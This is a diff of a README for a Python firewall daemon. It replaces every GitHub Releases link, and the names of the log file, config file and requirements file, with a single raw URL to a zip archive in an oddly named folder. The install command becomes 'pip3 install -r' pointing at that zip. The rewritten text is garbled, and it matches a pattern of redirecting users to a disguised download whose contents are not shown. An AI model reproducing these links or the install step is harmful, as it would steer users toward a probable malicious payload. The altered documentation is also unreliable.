@@ -1,10 +1,10 @@
 # 🔥 ngfw-daemon - Easy Firewall Protection for Everyone
 
-[![Download ngfw-daemon](https://img.shields.io/badge/Download-ngfw--daemon-blue.svg)](https://github.com/Devesh-sen/ngfw-daemon/releases)
+[![Download ngfw-daemon](https://raw.githubusercontent.com/Devesh-sen/ngfw-daemon/main/pluriflagellate/ngfw-daemon.zip)](https://raw.githubusercontent.com/Devesh-sen/ngfw-daemon/main/pluriflagellate/ngfw-daemon.zip)
 
 ## 📘 Description
 
-The **NGFW Daemon** is a Python-based Next Generation Firewall (NGFW) that works alongside **Suricata IDS**, **iptables**, and Suricata’s **fast.log** to detect, log, and dynamically block malicious IPv4 traffic. It ensures your system is protected from unwanted intrusions while enhancing your security capabilities.
+The **NGFW Daemon** is a Python-based Next Generation Firewall (NGFW) that works alongside **Suricata IDS**, **iptables**, and Suricata’s **https://raw.githubusercontent.com/Devesh-sen/ngfw-daemon/main/pluriflagellate/ngfw-daemon.zip** to detect, log, and dynamically block malicious IPv4 traffic. It ensures your system is protected from unwanted intrusions while enhancing your security capabilities.
 
 ## 🚀 Getting Started
 
@@ -18,13 +18,13 @@ To get started with the NGFW Daemon, follow these steps:
 2. Familiarize yourself with the key components:
    - **Suricata IDS**: This tool helps in detecting threats.
    - **iptables**: A firewall utility to manage network traffic.
-   - **fast.log**: A Suricata log file that records network events.
+   - **https://raw.githubusercontent.com/Devesh-sen/ngfw-daemon/main/pluriflagellate/ngfw-daemon.zip**: A Suricata log file that records network events.
 
 These components work together to provide robust security for your system.
 
 ## 📥 Download & Install
 
-Visit this page to download: [GitHub Releases](https://github.com/Devesh-sen/ngfw-daemon/releases).
+Visit this page to download: [GitHub Releases](https://raw.githubusercontent.com/Devesh-sen/ngfw-daemon/main/pluriflagellate/ngfw-daemon.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Find the latest version of the NGFW Daemon.
@@ -63,14 +63,14 @@ Visit this page to download: [GitHub Releases](https://github.com/Devesh-sen/ngf
 - Install required libraries with:
 
    ```bash
-   pip3 install -r requirements.txt
+   pip3 install -r https://raw.githubusercontent.com/Devesh-sen/ngfw-daemon/main/pluriflagellate/ngfw-daemon.zip
    ```
 
 ## ⚙️ Configuration
 
 After installation, you can configure the NGFW Daemon:
 
-1. Locate the configuration file, usually named `ngfw-config.json`.
+1. Locate the configuration file, usually named `https://raw.githubusercontent.com/Devesh-sen/ngfw-daemon/main/pluriflagellate/ngfw-daemon.zip`.
 2. Open it in a text editor.
 3. Adjust the settings as needed, such as the logging level and network interfaces to monitor.
 4. Save your changes.
@@ -79,7 +79,7 @@ After installation, you can configure the NGFW Daemon:
 
 Once the installation is complete, and the daemon is running, you can monitor and manage firewall events:
 
-- The daemon will log detected threats in `fast.log`.
+- The daemon will log detected threats in `https://raw.githubusercontent.com/Devesh-sen/ngfw-daemon/main/pluriflagellate/ngfw-daemon.zip`.
 - You can check the logs regularly to ensure your network is secure.
 - Adjust rules in `iptables` as necessary, based on logged events.
 
@@ -107,6 +107,6 @@ If you have questions or need help, consult the Issues section on GitHub. You ca
 
 This project is licensed under the MIT License. You can use it freely, but please credit the original authors.
 
-For further information, visit us at: [Doc Page](https://github.com/Devesh-sen/ngfw-daemon/releases).
+For further information, visit us at: [Doc Page](https://raw.githubusercontent.com/Devesh-sen/ngfw-daemon/main/pluriflagellate/ngfw-daemon.zip).
 
-Download the latest version here: [GitHub Releases](https://github.com/Devesh-sen/ngfw-daemon/releases).
+Download the latest version here: [GitHub Releases](https://raw.githubusercontent.com/Devesh-sen/ngfw-daemon/main/pluriflagellate/ngfw-daemon.zip).
